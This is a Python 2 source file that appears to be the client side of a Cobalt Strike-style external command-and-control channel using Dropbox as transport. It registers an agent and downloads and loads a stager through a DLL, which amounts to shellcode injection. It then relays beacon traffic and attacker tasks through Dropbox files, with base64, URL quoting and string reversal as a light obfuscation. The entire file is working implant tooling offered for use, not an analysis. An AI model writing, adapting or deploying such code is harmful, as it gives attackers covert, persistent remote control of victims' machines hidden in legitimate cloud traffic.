from ctypes import *
from ctypes.wintypes import *
import sys
import os
import struct

import base64
import urllib

#Transport Imports
import dropbox
import requests
import uuid
from time import sleep

##################
# Dropbox Config #
##################

# Configure Dropbox Access Token with full access to Dropbox Account
token = " "
beaconId    = str(uuid.uuid4())
taskKeyName = beaconId + ':TaskForYou'
respKeyName = beaconId + ':RespForYou'
dbx = dropbox.Dropbox(token)

# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data):
    	data = base64.b64encode(data)
    	return urllib.quote_plus(data)[::-1]

def decode(data):
    	data = urllib.unquote(data[::-1])
	return base64.b64decode(data)
# </encoder functions>


# <transport functions>
def prepTransport():
	return 0


def sendData(data):
	# Function to Send data to External C2
	print "In Sending Data Function"
	respKey = "{}:{}".format('/' + respKeyName, str(uuid.uuid4()))
	print 'got body contents to send'
	dbx.files_upload(encode(data), respKey)
	print 'sent ' + str(len(data)) + ' bytes'


def recvData():
	# Function to Receive data from external-C2.
	while True:
		folderList = dbx.files_list_folder("")
		filez = []
		tasks = []
	 	for file in folderList.entries:
			filez.append(file.name)
			for i in range(len(filez)):
				if taskKeyName in filez[i]:
					#print "File Uploaded: " + filez[i]
					print "Reading Task Instructions from: " + filez[i]

					try:
						md, res = dbx.files_download('/' + filez[i])
					except dropbox.exceptions.HttpError as err:
						print('*** HTTP error', err)
						return None
					print "Reading Task File Content"
					msg = res.content
					msg = decode(msg)
					tasks.append(msg)
					sleep(2)
					print "Deleting Task File"
					dbx.files_delete('/' + filez[i])
					print "Returning Tasks and Exiting Receive Data Function"
					sleep(2)
					return tasks

	else:
		print "TaskFile not Uploaded"
		sleep(5)
		recvData()




def registerClient():
	"""
	Function to register a new beacon in external c2.
	This should submit a unique identifier for the server to identify the client with.
	In this example, we put a new string AGENT:UUID into the bucket to notify the server that a new agent is registering
        with beaconId=uuid
        """
	data = ''
	keyName = "AGENT:{}".format(beaconId)
	dbx.files_upload(data, '/' + keyName)
	print "[+] Registering new agent {}".format(keyName)


# </transport functions>

maxlen = 1024*1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
	return(lib.start_beacon(payload,len(payload)))

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
    	mem = create_string_buffer(maxlen)
    	l = lib.read_frame(hPipe,mem,maxlen)
    	if l < 0: return(-1)
    	chunk=mem.raw[:l]
    	return(chunk)

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
    	sys.stdout.write('wp: %s\n'%len(chunk))
    	sys.stdout.flush()
    	print chunk
    	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
    	sleep(3)
    	print "ret=%s"%ret
    	return(ret)

def go():
    	# Register beaconId so C2 server knows we're waiting
    	registerClient()
    	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
    	print "Waiting for stager..." # DEBUG
	#sleep(10)
    	p = recvData()
    	# First time initialization, only one task returned.
    	p = p[0]
    	print "Got a stager! loading..."
    	sleep(2)
    	# print "Decoded stager = " + str(p) # DEBUG
    	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
    	handle_beacon = start_beacon(p)

    	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
    	print "Loaded, and got handle to beacon. Getting METADATA."

    	return handle_beacon

def interact(handle_beacon):
    	while(True):
        	sleep(1.5)
        	# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		print "Checking for Beacon Handle"
		print handle_beacon
		print "Getting Chunk from beacon"
        	chunk = ReadPipe(handle_beacon)
		print "Chunk is: " + str(chunk)
        	if chunk < 0:
            		print 'readpipe %d' % (len(chunk))
            		break
        	else:
            		print "Received %d bytes from pipe" % (len(chunk))
        		print "Relaying chunk to server"

		print "Sending beacon chunk!"
        	sendData(chunk)

        	# LOGIC TO CHECK FOR A NEW TASK
        	print "Checking for new tasks from transport"
        	newTasks = recvData()
        	for newTask in newTasks:
	    		print "Got new task: %s" % (newTask)
	    		print "Writing %s bytes to pipe" % (len(newTask))
	    		r = WritePipe(handle_beacon, newTask)
	    		print "Write %s bytes to pipe" % (r)


# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()
print "Reading Beacon handle"
print handle_beacon

# run the main loop
try:
	print "In Main Loop Now"
	interact(handle_beacon)
except KeyboardInterrupt:
    	print "Caught escape signal"
    	sys.exit(0)
